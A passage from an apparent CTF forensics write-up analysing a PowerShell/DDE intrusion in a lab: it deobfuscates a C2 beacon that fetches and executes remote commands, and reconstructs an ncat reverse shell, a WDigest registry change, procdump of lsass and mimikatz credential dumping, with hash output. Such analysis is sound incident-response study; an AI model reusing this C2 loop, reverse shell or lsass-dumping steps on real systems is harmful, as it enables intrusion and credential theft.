7ryLrilrnAt/xPI3el1BveuHIWnM0zOV37FfzfD+9X0t1+sA5i95X5vkleSZq/uT1HiDhYdOrHxmIm43qfHOZm6V59Fk485cXV3+++/L03+rj3ffN60/33R9f7z/dfdw19dXr/dViMSmK2aRYvJ2Ui/lkUUxu55PiZrw6s//m5aQsr8efbyfXs8nNpJiPv96Ov44fs9vJ+FcWN5Px4fG/4u3byfV0/CjHW8rJzdwWKKfjDzfjlel0cjt79epNff/96f5u+PLx7+++Vqvq6W7tHl++evO7+/TtH18+rq7+fHP18uqHD9/ef/HVL2Xx648//P7t/eZw/8ts/uuPL44vXv0P&#x27; ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt&#123;NEW-obJEct iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)&#125; | fOREacH-obJeCt&#123;$_.reADToend()&#125;)</span><br></pre></td></tr></table></figure>

<p>The payload can be observed. According to the analysis experience of powershell malicious samples, we can get <code>&amp; ($sHellid[1]+$sheLLiD[13]+&#39;X&#39;)</code> represents iex, so we only need to turn it into <code>echo</code> and then run it Get the next stage:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL &#x27; &#x27;, (&#x27;76492d1116743f0423413b160</span><br><span class="line">50a5345MgB8AHUAQgAxAEsAZQBQAE8AUQA4AHQAVAB5ADEAcwBXAFYALwBVADcAUAAyAGcAPQA9AHwA</span><br><span class="line">MQAzADcAMwAwAGIAOQA2ADMANQAwAGYAOABlADUAOQAxAGEAMgA4ADAAOQAzAGQAMABjADYAZgA2ADQ</span><br><span class="line">AOAAxAGYAZAA4AGUAMAA2ADIANABmADQAMgAzADMAYwAxAGQANgA4ADEANgAwADcANgA1AGYANgBjAG</span><br><span class="line">UAZQA1ADAAMwA4ADMAZQA5AGMAOQAzAGUAYgBhAGIANgA1ADEANQBjAGYAYwBiADIAOQA2ADcAYgA4A</span><br><span class="line">GEAZAA3AGYANABhAGYAYgA2ADgANQAyADkAOAA1ADUAYQA2ADkAMwAzADMANwBkADIAOQA1ADkAZgBh</span><br><span class="line">ADkANAA1AGYANwA1ADIAZAA2AGMAMgBhADYANQBjADAAYwA4AGEAYQA0AGYAZQBiAGUAYgA2AGQAOQA</span><br><span class="line">4AGIAOAA1AGYAZAA1ADMANgBkADYANQBkADMAZQBiADAANQBjADkAMABmADMANQA0AGYAOQBiADMAMQ</span><br><span class="line">A2ADkAOQAyADcAZgA2ADcAZgBiADAAYQAxAGYANAAzAGIAYQBjADQANwA2ADgAYwA4ADYAOAA2ADcAY</span><br><span class="line">wA2ADAAZABkADkAOQAwADAAYgAzADYAMgA2ADUAZQA0AGYANAA2AGEAYgAwAGMAOAAwADAANQA4ADkA</span><br><span class="line">NQBlAGYAYwBhADkANAAwADEANgBkADgAMwAzAGEAYQBlADMAMgAxAGEAMQBiADAAMwAwADQANQA1ADQ</span><br><span class="line">AYQAzADIAYwA4AGQAZQBkADUAZABlAGIAMwA2ADgAYgA4AGYANAAyADUAZAAxADIAOAA0AGYANwA2AD</span><br><span class="line">cAMABjADMAOAA1ADMAMwAyADkAZQA2AGEANwBmADAAZAA2ADUAMwBkADkAYgAzADcAMgA4ADEAZAA2A</span><br><span class="line">GIANwAwADUAYwA0ADMAYQAwAGUAZgA0ADYAZQBiADkAYgA5ADcANQA5ADkAYQA0ADEAMgBhADQAYQA4</span><br><span class="line">ADYAMQBhADIAYgA4ADcANwAzADIAMABjADIAMQA3ADgAYwA0ADIAYwA0ADYAZgAwAGIANQBmAGEAYQA</span><br><span class="line">3AGIANQBlADMANgAwAGEANwAwAGMAMgBlADgAYQA5ADAAYwBlADkAMgBjADgAMgA3ADIAMAA4ADMANw</span><br><span class="line">BiAGQANAA1AGYAOQBlADQANABkADkAMgBiADAAZQBiADgAYgA4ADQAZQA2AGQANgBlADAAYgA5ADcAN</span><br><span class="line">QBhAGQAYQA2ADMAZgAwADcAMAA3ADcAYgA5AGYAYwAxADcANQBjADUANgAwAGMAZQA4ADYAZAA4ADkA</span><br><span class="line">ZABhADgAOQA1AGQAMQA5AGEAMQAzADUANgAxADUAMAAyAGQANgA2AGMAZQBmAGQAYwBlADUAMABiADA</span><br><span class="line">AYQA5ADIAOABlADMAZABkAGUANAAzADIAZgAwAGEANgA3ADkANQA3ADYANgA3ADIAOQBjAGUANgBkAD</span><br><span class="line">QAZAAwAGUAZAAwADgAZAA5ADQANgBlADYAMwAyADIANQAyADkANABmADgAYwA5ADkAMAA0AGQAZgBkA</span><br><span class="line">DEAYwAxAGUAOQAxADcAZgAyAGMANQBkAGYAMwAzADMANgBlAGEAZgBmAGMANgBjAGMAZABkAGQAMAA5</span><br><span class="line">ADAAZQAzADQAZAAwADYAZAAyADUAMwA2AGMANgA2ADAANAAyADUANgA2ADUAYwA0ADQAZQAyADIAMgB</span><br><span class="line">mADAANQAyAGEAYwA5ADAAZAAzADYAZAAzAGYAYQA2AGEAOAA0ADIAOQAwADAAMQAwAGYAOQBhADAAMw</span><br><span class="line">BkAGYAMQBiAGMANgAwAGMAZAA4ADEANAA5AGEAMwAyAGQAOQBlADcANwBkADEAYQBiADUANQA0ADIAZ</span><br><span class="line">ABhADQANwBmADAAYQA2ADYAMAAyADEANABmADAAMgAyAGEAMQAxAGQANgBjADgAOQA2ADYAYgA1AGQA</span><br><span class="line">NQAwADIAMwBiADQANwAxADkAZgA5AGIANAA4AGQAYwAwADAANABiADIANgA2ADEAMwAwADIAYQA1ADI</span><br><span class="line">AOQA2ADgAOQBmADgANgAwAGUAYwAyAGUANwAyAGUANAA1AGEAZABhAGEAMgA5ADQAZQAxAGUAMgA0AD</span><br><span class="line">cAMQAzAGYANAAyADMAYQAzAGMAZgBlAGEANQA0ADQAYQBmADEAZAA1AGYANQBiADQANQA2ADgAZQBhA</span><br><span class="line">GYAZQA4ADYAYgBhADgAMgBjADAAZQBjADIAMQAyADQAMgAyADAANAA4ADAAMAAyAGIAMgBiAGQANwBj</span><br><span class="line">AGYAYQA3ADIAMABhAGMANgA1AGYAZgA4ADcAZQA2ADcANwA5AGQAMAA2AGEANgBlADkAZgA1AGIAOQA</span><br><span class="line">0AGEAMwBiADAANgA4ADMAZAAwADQANQBkAGIAYwBmAGEANwBiADkAMAA1ADgAMABiAGYAYgA1AGEAMg</span><br><span class="line">AxAGUAMQA0ADgANgAzADgAYQAwADcANQBlADUAYgA5AGUAYgAxADQANQA2AGQAYgAzADEAZgA0AGQAZ</span><br><span class="line">QBiADMAZABlADIANQBiAGYANgA5AGUANQA5ADYAYgA4AGEAMgBjADcAYgA5ADUAOAAxAGMAZQAwADcA</span><br><span class="line">ZAAzADQAMwA0ADIAMwA5ADMAYQAyADUAMQBkADUAYgBlADQANABmADgAMgBiADYAMgA3ADgAYgAxAGM</span><br><span class="line">AMQBhAGMANQAyAGQANgBlADcANAA1AGYANAA5ADMAMAA5ADcANwBkAGIAMwA0AGUAYQBjADEANwAwAG</span><br><span class="line">UAZQBhADEAZQAzADUAZAA0ADIAYQBjADAAMQA2ADYAOABlADQAMAAxADcANwA4AGUAZABjADgAZAA5A</span><br><span class="line">GIAZQA0ADcANgBmADAANwBiADgAOAA4ADIAYgA4AGIAYwA2ADgAZQA3ADgAYQA2AGQAMwAzAGMAZQBl</span><br><span class="line">AGUANQAzADIAZQBkAGMAYQBhADkANwBhAGEAOAAwADEAZgA0ADEAMwAxADAAYwA2AGEAZgBmAGMAZgB</span><br><span class="line">lADEAYQA5ADcAOAAxADEAOQAwADEAYwBkADIAOQAwAGYANgBhADkAYwBlAGQAYQBmADYAYwBmADYAOA</span><br><span class="line">A1ADMAMAAxADQANgA2ADUAZABhADMAYgAwADEAZQAwADgAMwAxADMAMgA5ADYAOQA1AGYANAAwADgAO</span><br><span class="line">ABjAGYANABmAGEAMgAxADQAZQA3ADUAMgA2ADQAOABhAGMAYgBlADAAYgA2ADcAYwAyAGMAOQA0AGIA</span><br><span class="line">MwBlAGIANAAxADkAMwAyAGIAZQBhADMANQA4AGUAOQBkAGQANQA3AGUAYgAyADcAZABmADQAZQBiADQ</span><br><span class="line">AOQBmADQAMAA5AGEAOABhADYAOABhAGIAZQBlADAAYQA2ADUAZgA3ADEANQBkADIANABiADcAYwAxAG</span><br><span class="line">IANQAwADgAZQBlAGUAMQBjAGEANAA1ADYAMgBiAGYAMwA4ADAAMwBiADIAZgAwADAAYQAxADEAOAAwA</span><br><span class="line">DQAYgA3ADcAMwBhADEANABkAGQANQA1ADQAZgA1AGMAMAA5ADQAOQA0ADAAZgA3AGIAMwA3AGIAMwAx</span><br><span class="line">ADAAZQBjADQAYQA3ADYAMQBkADQAOQA3AGEAOABiAGYAZgBhAGMAZQAyADAAMgA3ADIAOQAxADIAZgB</span><br><span class="line">hADQAYwBhADkAYwA4ADAANwA0ADUANwAyADgAZQAzADUAMQBlADIAMgA1ADYAMAAwADAAOAAyAGIAYQ</span><br><span class="line">A4AGYAZQBiAGEAMAA3AGYAMgBjAGIANgBkAGMAZgAxAGIAYgA4ADEAMgA4ADAANQA3ADMANAA3ADcAO</span><br><span class="line">QA5AGUANQA2ADUAMQAwAGQANAA1AGYANQAyAGQAYwBiADUAZgAzADgAMABmADIANwAxAGMAZQBhAGYA</span><br><span class="line">OABiADUANQBiAGQAZgBkAGMAMABjAGIANwBjADAANAA5AGYAZABkADAAMgAwADAAYwA5ADcAYwA3ADQ</span><br><span class="line">ANwBkADQAYgAwAGYAZABkAGYAMwAzADUAZQAwADgAZAAyADIAYQA4ADQAOQBlADgAZgBjAGMAMgAzAD</span><br><span class="line">cANAAyADcAZgBhADMAZgA4ADUAMgBhADAANQAxADkAYgAyAGQAYwBjADQAOQA1ADUANwAwADUAYgA0A</span><br><span class="line">DgAOQBkADEAYwAzADgAMAA3ADUAOAA5AGEAYQBiADYAZQA5ADEAYQAxADMAMgBkADYAZAA5ADYAMQAz</span><br><span class="line">AGQAZAA2AGYANQAyAGQANgA1ADIAMAA5ADUAYgA2AGEAZQBjADkAMQBhAGIANQAyADUAMwA5ADQAMAA</span><br><span class="line">yADUAOQA0ADgAZgBmADgANAAwADYAMwBmAGIAMAA4AGQAZgA0ADUAYwAyAGQAOQAwADYANgA5ADkAOA</span><br><span class="line">BiAGYANAA1ADYAMQAyADUANQA1ADAAYwAzADUAYgAwAGQAMgA0ADUAZAA0AGUAYwAyAGYAMABkADAAO</span><br><span class="line">AA1ADgAYgA0ADcANAA1ADIAMAAwADIANwBlADYAYgA2ADUAOABlADMAYgA3ADYAYgBmAGQANQA2ADYA</span><br><span class="line">ZAAyADYAYwA4ADcANQAzADcAOABjAGMAMQBlADQANABmAGUAOQBhADUAYQBlADkAZABkAGMANQA2ADA</span><br><span class="line">AMQBmADYAMAAxADEAOQA3AGIAYwBiAGUANwA2ADIAZAA4ADkAYQA4AGEAMgBlAGQAMgA4ADQANAA4AD</span><br><span class="line">cANAA4AGEAYgA0AGIAMgA5ADgAOQBhAGUAMQAzADUAMwBkADMAMAA5ADMANQA1ADMAMQAyADEAYQBhA</span><br><span class="line">DkAOAA2ADgAOQBlAGEANwA2ADIANAA3ADgAOQAzAGEAYwA0ADkAYgBhAGMAMwBmAGQAZABiADYAZgA3</span><br><span class="line">ADAAZABkADIAMQA3ADAAYQA4ADQAOQBlADYANgAxADkAYQA3ADMAMgA0ADgAOQA2ADcAOQBkADEAYQB</span><br><span class="line">mAGYANwAzADcAYgA0ADAANgAzADgAZAA1AGYAZgBkADgAOQBjAGIAZgA4ADYAOAAwADcAOQBkADYAMA</span><br><span class="line">AxADYAMgBmADcANAAwAGUAOAA4ADYANQAzAGYAMwA5ADMAZQAxADYAMgBmADIAZABjAGEAMAA3ADIAM</span><br><span class="line">AA1AGQAYQA5AGYAOABkADMAZAA2AGYAMgAxAGQAYwA0ADAAMgAwADMANQA4AGUAYQBiADYAMQBlAGQA</span><br><span class="line">MAA3ADcAYQBlADgAOQBiADEANQA1ADQAZAA1ADgAMQA3ADQAMwBjAGYANQAxAGUAMQAyAGIAZQBjADI</span><br><span class="line">AYgBmADIAZgBlADUANAA3ADQAYQA5ADAANwBjADQANgA0AGEAYQAwADMAZAA0AGEAZQA1AGMAZgAzAG</span><br><span class="line">MAYgBlAGEAZQA2ADQAMABiADQAMQBhAGEAZQA5ADcAYwAxADAAZQBiADYAMQAyAGMANQAwADUAMQBiA</span><br><span class="line">GQAMQBkADUANAAwADQAZQA1AGMANQAzAGUAOAA3ADYAYwA3AGUANwBjADQAZgAzAGMANwAyADgANwA1</span><br><span class="line">ADQAOQBhADIAMwA1ADUAMgA2ADAANgA1ADYANwAwADcAMgBiAGUAYwA0ADYAOQA5ADQANgA5AGUAYgA</span><br><span class="line">0ADQAMQBjADUAYwA4AGQAMgBjAGIAYQAxADIAMwA3ADYAYQBlAGUAZgA0ADIANgBlAGMAZgA0AGIANQ</span><br><span class="line">A3ADcAOAAyAGEAYwA2ADMAZQBiADcANgAxADgANABiADcAMgA5ADAAMgA2ADkAZgBlAGEANQBjADgAZ</span><br><span class="line">gA4AGEAYwBjAGIAMgBkAGYANAA4AGQAOABmADkANgBjAGIAOQA4AGUAOQBjAGMAMwA3ADcAYwAyAGQA</span><br><span class="line">ZQA2ADQAMwBkADYAMQA5AGIANwAyADYAZQA5ADcAYQA5ADQANQBkADEANgA0AGQANAA2AGQAZQBlADA</span><br><span class="line">AZgBlADUAMAAzADkAYwBlAGYAZgBhADQANwA1AGEAMQBkADMAOAA1ADkAMAA1AGIAMAAyADIAMQA1AD</span><br><span class="line">EAOQA2AGUAYgA0AGUAOAA1ADYAYgA4ADEAMAA1ADAAYQBlAGUAMgBlADYAYwBkAGEANQBiAGUANwAzA</span><br><span class="line">DMAZAA1ADAAZgBjADYAMwA5AGEANABlADEAMABmADUAMwA2ADgANQBjADUAYgA5AGIAYQA3AGEAMwA1</span><br><span class="line">ADkANgBlADAAMgBiADYAZQA5AGEANgA0ADAAMAA0ADYAOABkAGMAMQAwADIAYwAzADgAOAAzAGIAMQB</span><br><span class="line">iADgAZgA1ADUAYQBmADIAZgBkAGMANAAzAGIANgA4AGUAOQBiADgANQBmADIAMAA5AGMAZAA1ADUAYg</span><br><span class="line">AyAGMAMwA4AGEAZABiADgAOAAwAGYANQBkADQAZgAzADkAYgA4AGYAOAA3ADIAYwAwAGUAMgAyADYAZ</span><br><span class="line">gAzADUAOQAzADgANQA3ADYAYwAyADAANQBlADEANwBlADEAZgBjADQAOAAwAGUAZQAyADIANABhADUA</span><br><span class="line">NwA4ADQAMwBiADIAZAA3ADYAYQBkADUANABhAGIAMwA1ADgANgA1AGYAYwAzAGEAYwA1ADAAMQA2ADg</span><br><span class="line">AZABlADMAYQA1AGEANwAxADQAMgBkAGQAZQA4AGMANwA5ADcAYgAzADUANwA3AGYAMgA5ADYAMgBlAD</span><br><span class="line">cAOQA3AGUAYgBmAGUAMgBiAGIAMwA0ADkAOQAyADcAMwBlADgAZQBmADMAOAAxADUAMwA1ADcANABiA</span><br><span class="line">DMAMABmADkAMgA3AGMAOAA5AGMANABlAGQAZQA3AGIAYQA2AGYANABkADAAMgBiADYAMgAyADQAZABl</span><br><span class="line">AGYANwBhADQAMAAxADMAYgBjADMAYwBjADkAZQBhADcANgBhADMAOAA0AGYAMwAwAGYAOQBmADUAOAB</span><br><span class="line">lADgAZAAwADgANAAzADAANABlAGEAMwAyAGMAZAAzADgAYgA2ADUAMgBmAGQAMwBjADgANwBhADkAMw</span><br><span class="line">AxAGUAMABiADQAMwAzAGIAOAA1AGUAMwAzADEAYgBlAGMAMQBiAGYAYgBmAGIANAAzAGUANwBjAGMAM</span><br><span class="line">wAxADMAYwAwAGYAMQBlADAAZgBmAGEAOAAyADEANgA4ADgAMwA3ADMANgA5AGQAMgA2AGEAZAA1ADYA</span><br><span class="line">YwBmAGYANgAxADAAOAA3AGQAMwAyADYAMQBlADgAMgAzAGMAOAAxADkAMwBhADYANwA3ADcAYQA3ADM</span><br><span class="line">AYgAwAGMAMAA2AGEANwBiAGMAZABmADIAZQBjADUAYwAxADYAMABhAGUANQBlADAAZgA2ADMAOAA3AD</span><br><span class="line">EANgA0ADEAOAA1ADUAMgAzADUAYQA5ADMANQA0AGMAOABiADAAMgAwAGQAMgAyAGIANQBmADQAOQBhA</span><br><span class="line">DQAYQAwADMAZAAxADkAMwAyADQAYgBkADUAMwAzADAANAAxADMAMwAxAGYANwAzADYAMgA1AGYAYwBh</span><br><span class="line">AGIAMQA2ADYANgBjAGQANgAwAGIANABkADYAOABhAGQAMQAzADEAMAA4AGYAYwBhAGUAOAA0ADYAYQA</span><br><span class="line">yAGMAOAA1AGUAMQA3ADgAOABiAGYANwBjAGMAZQAyADcAZgA1ADAAZQBiAGQAYQAwAGQAOAAyADQANA</span><br><span class="line">BjADIAYQA4ADMAYQBkADIAOAAxAGUANgBiADMANABlADMAZABiADMAMQA1ADcANABjADEAZQBjAGUAZ</span><br><span class="line">AAyAGIAMgA4ADEAYwBiADgAMgAwAGEAZgAzADUANgAyAGYAMwA3ADIANABmADkAOAA5ADcANwBiADUA</span><br><span class="line">NQAzAGYAMgA=&#x27; |ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,</span><br><span class="line">159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).Getn</span><br><span class="line">eTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+&#x27;x&#x27;)</span><br></pre></td></tr></table></figure>

<p>here <code>.($PsHoME[21]+$psHOme[34]+&#39;x&#39;)</code> is IEX, replace it with <code>Out-String</code> and run again, then you can get the decryption and format it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);</span><br><span class="line">$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);</span><br><span class="line">$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);</span><br><span class="line">$s=&#x27;172.21.20.96:8080&#x27;;</span><br><span class="line">$i=&#x27;eef8efac-321d465e-e9d053a7&#x27;;</span><br><span class="line">$p=&#x27;http://&#x27;;</span><br><span class="line">$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @&#123;</span><br><span class="line">    X-680d-47e8&quot;=$i</span><br><span class="line">&#125;;while ($true)&#123;</span><br><span class="line">    $c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e -Headers @&#123;</span><br><span class="line">        &quot;X-680d-47e8&quot;=$i&#125;</span><br><span class="line">    ).Content;</span><br><span class="line">    if ($c -ne &#x27;None&#x27;) &#123;</span><br><span class="line">        $r=iex $c -ErrorAction Stop -ErrorVariable e;</span><br><span class="line">        $r=Out-String -InputObject $r;</span><br><span class="line">        $t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @&#123;</span><br><span class="line">            &quot;X-680d-47e8&quot;=$i</span><br><span class="line">        &#125; -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join &#x27; &#x27;)</span><br><span class="line">    &#125; </span><br><span class="line">    sleep 0.8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1:"></a>flag1:</h3><p>Observe the part where the flag exists<br>Run that piece of code to get <a href="https://pastebin.com/hVCEUK1B">https://pastebin.com/hVCEUK1B</a> to visit again:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS $bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);</span><br><span class="line">PS $bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);</span><br><span class="line">PS $flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99)</span><br><span class="line">PS $flag</span><br><span class="line">https://pastebin.com/hVCEUK1B</span><br><span class="line"></span><br><span class="line">idek&#123;MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt&#125;</span><br><span class="line">Resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within</span><br></pre></td></tr></table></figure>

<p>then You can get the flag –&gt; <code>idek&#123;MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt&#125;</code></p>
<h2 id="HiddenGem-Mixtape-2-Credential-Access"><a href="#HiddenGem-Mixtape-2-Credential-Access" class="headerlink" title="HiddenGem Mixtape 2:  Credential Access:"></a>HiddenGem Mixtape 2:  Credential Access:</h2><p>According to the above clues, we already know some news, including <code>http://172.21.20.96/windowsupdate.ps1</code><br>However, in the subsequent log retrieval, I did not find the payload after interacting with <code>172.21.20.96:8080</code>, but the information exists in <code>C:/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx</code><br>Retrieve the log to locate a specific statement</p>
<p><img src="https://i.imgur.com/lKTCJ4E.png"></p>
<p>It can be seen that the parent process is EXCEL.exe and its child process is cmd.exe, and the child process of cmd is the command of powershell, which conforms to the example of running powershell with xlsx and DDE described above. After accepting the relevant configuration of C2, C2 uploaded an ncat to <code>C:\Users\IEUser\AppData\Local\Temp\SecurityUpdate.exe</code> of the target machine, and passed the command <code>&quot;C:\Users\IEUser\AppData\Local\ Temp\SecurityUpdate.exe&quot; 172.21.20.96 4444 -e cmd.exe</code> to reverse shell</p>
<p><img src="https://i.imgur.com/57buYor.png"></p>
<p>execute shell (cmd.exe)</p>
<p><img src="https://i.imgur.com/7WsltHt.png"></p>
<h3 id="Ncat"><a href="#Ncat" class="headerlink" title="Ncat:"></a>Ncat:</h3><p>Continuing to search upwards, we found that the cmd as the main process executed some commands to detect or collect some relevant credentials</p>
<p>Execute <code>whoami</code>:</p>
<p><img src="https://i.imgur.com/p0uCe3H.png"></p>
<p>Execute <code>arp -a</code>:</p>
<p><img src="https://i.imgur.com/BxFKJNZ.png"></p>
<p>Execute <code>ipconfig /all</code>:</p>
<p><img src="https://i.imgur.com/VvpHFOj.png"></p>
<p>Execute <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</code> to prepare for dump lsass</p>
<p><img src="https://i.imgur.com/uq7CgO8.png"></p>
<p>Afterwards, UpdateAgent.exe (procdump) and mimikatz.exe should be uploaded to <code>C:\Windows\System32\</code> through powershell, but I didn’t find the local related logs. If anyone finds them, please let me know.</p>
<h3 id="procdump-amp-amp-mimikatz"><a href="#procdump-amp-amp-mimikatz" class="headerlink" title="procdump &amp;&amp; mimikatz:"></a>procdump &amp;&amp; mimikatz:</h3><p>Execute <code>C:\Windows\System32\UpdateAgent.exe -accepteula -ma lsass.exe C:\Windows\System32\errordump</code> lsass.exe and save the data in <code>C:\Windows\System32\error.dmp</code></p>
<p><img src="https://i.imgur.com/Ql2srkz.png"></p>
<p>Execute <code>C:\Windows\System32\mimikatz.exe</code></p>
<p><img src="https://i.imgur.com/a78FNXr.png"></p>
<p>Since the description mentioned that there are two parts of the flag for this topic, we need to obtain the first part of the flag according to the idea</p>
<h3 id="The-first-part-flag2"><a href="#The-first-part-flag2" class="headerlink" title="The first part flag2:"></a>The first part flag2:</h3><p>First extract <code>C:\Windows\System32\error.dmp</code></p>
<p><img src="https://i.imgur.com/xmlVYhz.png"></p>
<p>Download a mimikatz <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z">https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z</a></p>
<p>Admin runs cmd which then runs mimikatz</p>
<p>ps: For convenience, I renamed error.dmp to lsass.dmp and put it in the same directory as mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br><span class="line">Switch to MINIDUMP : &#x27;lsass.dmp&#x27;</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonPasswords full</span><br><span class="line">Opening : &#x27;lsass.dmp&#x27; file for minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 284687 (00000000:0004580f)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : IEUser</span><br><span class="line">Domain            : IEWIN7</span><br><span class="line">Logon Server      : IEWIN7</span><br><span class="line">Logon Time        : 2023/1/8 2:47:38</span><br><span class="line">SID               : S-1-5-21-1610009768-122519599-941061767-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00010000] CredentialKeys</span><br><span class="line">         * NTLM     : 022156166aa2ab0ce4de16a45098d745</span><br><span class="line">         * SHA1     : ece4d499be6e18ebf42225da680e702abf639db3</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : IEUser</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * NTLM     : 022156166aa2ab0ce4de16a45098d745</span><br><span class="line">         * SHA1     : ece4d499be6e18ebf42225da680e702abf639db3</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : IEUser</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * Password : idek&#123;crEDentia</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : IEUser</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 95278 (00000000:0001742e)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : sshd_server</span><br><span class="line">Domain            : IEWIN7</span><br><span class="line">Logon Server      : IEWIN7</span><br><span class="line">Logon Time        : 2023/1/8 2:46:44</span><br><span class="line">SID               : S-1-5-21-1610009768-122519599-941061767-1002</span><br><span class="line">        msv :</span><br><span class="line">         [00010000] CredentialKeys</span><br><span class="line">         * NTLM     : 8d0a16cfc061c3359db455d00ec27035</span><br><span class="line">         * SHA1     : 94bd2df8ae5cadbbb5757c3be01dd40c27f9362f</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : sshd_server</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * NTLM     : 8d0a16cfc061c3359db455d00ec27035</span><br><span class="line">         * SHA1     : 94bd2df8ae5cadbbb5757c3be01dd40c27f9362f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : sshd_server</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * Password : D@rj33l1ng</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : sshd_server</span><br><span class="line">         * Domain   : IEWIN7</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IEWIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : IEWIN7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : iewin7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 44073 (00000000:0000ac29)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : IEWIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/1/8 2:46:43</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : IEWIN7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : iewin7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : 